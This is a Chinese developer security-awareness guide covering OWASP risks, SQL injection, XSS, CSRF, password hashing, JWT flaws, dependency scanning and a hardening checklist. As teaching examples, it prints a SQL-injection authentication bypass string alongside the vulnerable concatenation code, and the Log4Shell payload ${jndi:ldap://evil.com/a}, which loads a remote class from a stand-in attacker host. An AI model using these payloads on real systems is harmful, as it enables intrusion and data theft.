# 安全意识

> 安全不是 Ops 的事，是每一位开发者的责任。一条 SQL 注入可能导致整个公司数据泄露。

---

## 一、OWASP Top 10（2021）

```
1. 破解访问控制（Broken Access Control）
2. 加密失败（Cryptographic Failures）
3. 注入（Injection）
4. 不安全设计（Insecure Design）
5. 安全配置错误（Security Misconfiguration）
6. 易受攻击的组件（Vulnerable Components）
7. 身份认证失败（Identification and Authentication Failures）
8. 软件和数据完整性故障
9. 安全日志和监控失败
10. 服务端请求伪造（SSRF）
```

## 二、常见漏洞与防护

### 2.1 SQL 注入（⭐ 最高危）

```
❌ 危险代码：
String sql = "SELECT * FROM users WHERE name = '" + name + "'";
// 攻击者输入：admin' OR '1'='1
// 最终 SQL：SELECT * FROM users WHERE name = 'admin' OR '1'='1'
// → 绕过认证！

✅ 安全代码（参数化查询）：
String sql = "SELECT * FROM users WHERE name = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, name);  // 参数绑定，不会被当作 SQL 执行
```

**MyBatis 中的注入风险**：
```xml
<!-- ❌ 危险：${} 直接拼接字符串 -->
<select id="findUser" resultType="User">
    SELECT * FROM user WHERE name = '${name}'
</select>

<!-- ✅ 安全：#{} 参数化 -->
<select id="findUser" resultType="User">
    SELECT * FROM user WHERE name = #{name}
</select>
```

### 2.2 XSS（跨站脚本攻击）

```
反射型 XSS：
攻击者发一个带恶意脚本的链接，用户点击后执行。

存储型 XSS：
恶意脚本被存到数据库，所有访问页面的用户都会执行。

DOM 型 XSS：
前端 JS 直接操作 DOM，未过滤用户输入。

防护：
✅ 输出转义（HTML Entity 编码）
✅ CSP（Content Security Policy）响应头
✅ 前端框架自动转义（React/Vue 默认安全）
```

### 2.3 CSRF（跨站请求伪造）

```
攻击流程：
1. 用户登录了 bank.com（Cookie 有效）
2. 攻击者诱导用户访问 evil.com
3. evil.com 自动提交表单到 bank.com/transfer
4. 浏览器自动带上 bank.com 的 Cookie → 攻击成功

防护：
✅ CSRF Token（每次请求带随机 Token）
✅ SameSite Cookie（Strict / Lax）
✅ 验证 Referer / Origin 头
```

### 2.4 敏感信息泄露

```
❌ 危险：
log.info("用户登录成功, password={}", password);  // 密码明文记日志！
log.info("身份证号: {}", idCard);  // 敏感信息日志泄露

✅ 安全：
log.info("用户登录成功, userId={}", userId);  // 不记密码
log.info("用户认证通过, userId={}, idCard={}", userId, maskIdCard(idCard));
// maskIdCard: 110***********1234
```

### 2.5 暴力破解

```
防护：
✅ 登录失败 N 次后锁定账号（如 5 次锁定 30 分钟）
✅ 验证码（图形/短信/滑块）
✅ 限流（同一 IP 每分钟最多 5 次尝试）
✅ 多因素认证（MFA）
```

## 三、加密与哈希

### 3.1 密码存储（⭐ 必考）

```
❌ 绝对不能用：
- MD5（已被攻破，可彩虹表反查）
- SHA1（已被攻破）
- 明文存储（违法！等保 2.0 不通过）

✅ 正确做法（加盐哈希）：
1. 每个用户生成独立盐值（Salt）
2. 使用慢哈希算法（BCrypt / SCrypt / Argon2）
3. 迭代次数足够（BCrypt cost=12+）

Java 实现（BCrypt）：
String hashed = BCrypt.hashpw(password, BCrypt.gensalt(12));
boolean matched = BCrypt.checkpw(password, hashed);
```

### 3.2 数据传输加密

```
✅ HTTPS（TLS 1.2+）
✅ 敏感数据不通过 URL 传输（用 POST Body）
✅ 敏感配置加密存储（Jasypt / AES）
```

### 3.3 JWT 安全

```
风险 1：算法混淆攻击
→ 恶意修改 JWT 头 alg 为 none，绕过签名验证
→ 防护：服务端明确指定允许的算法

风险 2：弱密钥
→ HS256 密钥太短（< 256 bit）被爆破
→ 防护：密钥长度 ≥ 256 bit，定期轮换

风险 3：Token 泄露
→ XSS 偷走 Token、中间人劫持
→ 防护：HttpOnly + Secure Cookie、短过期时间 + 刷新 Token
```

## 四、依赖安全

### 4.1 已知漏洞依赖

```
扫描工具：
- OWASP Dependency-Check
- Snyk
- Trivy

真实案例：
Log4j2 漏洞（CVE-2021-44228）：
→ 攻击者在日志中注入 ${jndi:ldap://evil.com/a}
→ 触发 JNDI 远程加载恶意类
→ 全量扫描 + 紧急升级所有使用 Log4j2 的项目
```

### 4.2 依赖锁定

```xml
<!-- ✅ 锁定依赖版本，避免传递依赖引入漏洞版本 -->
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.17.1</version>  <!-- 已知安全版本 -->
        </dependency>
    </dependencies>
</dependencyManagement>
```

## 五、安全配置检查清单

```
□ 生产环境关闭 Devtools（Spring Boot DevTools）
□ 生产环境关闭 Actuator 敏感端点（/env、/dump）
□ 配置文件中的密码加密（不写明文）
□ 数据库账号最小权限（不用的 DROP/GRANT 权限）
□ JWT Secret 定期轮换
□ Cookie 设置 HttpOnly + Secure + SameSite
□ 响应头包含安全头（X-Frame-Options、CSP、X-Content-Type-Options）
□ 文件上传限制类型 + 大小 + 存储位置（不在 Web 根目录）
□ 错误信息不暴露内部细节（堆栈 / SQL 语句）
```

## 六、等保 2.0 关注点

```
三级等保要求（互联网应用基本都要）：
✅ 身份鉴别（MFA）
✅ 访问控制（最小权限）
✅ 安全审计（日志保留 ≥ 6 个月）
✅ 入侵防范（WAF、限流）
✅ 数据完整性（传输加密、存储加密）
✅ 数据备份（每天全量 + 增量）
```
